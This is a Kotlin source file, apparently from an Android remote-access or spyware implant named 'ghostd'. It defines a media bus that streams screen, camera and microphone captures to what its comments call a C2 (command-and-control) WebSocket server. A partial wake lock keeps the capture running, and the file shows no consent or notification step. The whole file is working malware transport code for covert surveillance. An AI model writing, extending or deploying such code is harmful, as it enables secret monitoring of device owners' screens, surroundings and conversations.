package com.tg.ghostd

import android.content.Context
import android.os.PowerManager
import com.neovisionaries.ws.client.WebSocket
import org.json.JSONObject
import java.util.concurrent.atomic.AtomicLong

/**
 * Shared streaming bus for all live/recorded capture sources
 * (screen / camera / microphone).
 *
 * Concurrency: only ONE capture source may be active at a time. A second
 * source that calls [begin] while another is active gets a "busy" exception.
 * (MediaProjection and Camera2 both dislike concurrent consumers, and one
 * busy source keeps the story simple on the server side too.)
 *
 * Wire format for streamed media over the existing C2 WebSocket:
 *   - stream lifecycle as text messages:
 *       {"type":"stream_start","stream":"screen-live","cmd_id":.., ...meta}
 *       {"type":"stream_end",  "stream":"screen-live","frames":N,"reason":..}
 *   - each frame as ONE binary message:
 *       UTF-8 JSON header + b'\n' + payload
 *     header = {"type":"frame","stream":..,"seq":..,"ts":ms,"len":payloadLen,
 *               ...extra (e.g. rate/channels for audio, encoding for video)}
 *   - video frames are JPEG (MJPEG-over-WS), audio frames raw PCM s16le.
 */
object MediaBus {

    const val SOURCE_SCREEN = "screen"
    const val SOURCE_CAM = "cam"
    const val SOURCE_MIC = "mic"

    @Volatile var activeSource: String? = null
        private set

    @Volatile private var ws: WebSocket? = null
    private val seq = AtomicLong(0)

    @Volatile private var wakeLock: PowerManager.WakeLock? = null
    private val lock = Any()

    /** Claim the single capture slot; throws if another source is active. */
    fun begin(source: String, ctx: Context, socket: WebSocket?) {
        synchronized(lock) {
            activeSource?.let { active ->
                throw Exception("busy: $active capture already active; stop it first")
            }
            activeSource = source
            ws = socket
            seq.set(0)
            val pm = ctx.getSystemService(PowerManager::class.java)
            wakeLock = pm?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ghostd:media")
                ?.also { it.acquire(STREAM_WAKE_TIMEOUT_MS) }
        }
    }

    /** Release the capture slot (only if we still own it). */
    fun end(source: String) {
        synchronized(lock) {
            if (activeSource == source) {
                activeSource = null
                ws = null
            }
            wakeLock?.let { w ->
                try {
                    if (w.isHeld) w.release()
                } catch (_: Exception) {
                }
            }
            wakeLock = null
        }
    }

    fun isActive(source: String): Boolean = activeSource == source

    /** Send a stream lifecycle / metadata text message (best effort). */
    fun sendText(msg: JSONObject) {
        try {
            ws?.sendText(msg.toString())
        } catch (_: Exception) {
            // socket died; capture loops detect via sendFrame()==false
        }
    }

    /**
     * Send one framed binary payload. Returns false when the socket is gone
     * (caller should end the stream).
     */
    fun sendFrame(stream: String, payload: ByteArray, extra: JSONObject? = null): Boolean {
        val w = ws ?: return false
        val header = JSONObject()
            .put("type", "frame")
            .put("stream", stream)
            .put("seq", seq.incrementAndGet())
            .put("ts", System.currentTimeMillis())
            .put("len", payload.size)
        if (extra != null) {
            for (k in extra.keys()) header.put(k, extra.get(k))
        }
        val hb = header.toString().toByteArray(Charsets.UTF_8)
        val out = ByteArray(hb.size + 1 + payload.size)
        hb.copyInto(out)
        out[hb.size] = '\n'.code.toByte()
        payload.copyInto(out, hb.size + 1)
        return try {
            w.sendBinary(out)
            true
        } catch (_: Exception) {
            false
        }
    }

    /** Convenience: stream_start text message. */
    fun streamStart(stream: String, meta: JSONObject) {
        sendText(
            JSONObject()
                .put("type", "stream_start")
                .put("stream", stream)
                .put("encoding", "mjpeg")
                .put("meta", meta)
        )
    }

    /** Convenience: stream_end text message. */
    fun streamEnd(stream: String, frames: Long, reason: String) {
        sendText(
            JSONObject()
                .put("type", "stream_end")
                .put("stream", stream)
                .put("frames", frames)
                .put("reason", reason)
        )
    }

    private const val STREAM_WAKE_TIMEOUT_MS = 30 * 60 * 1000L
}
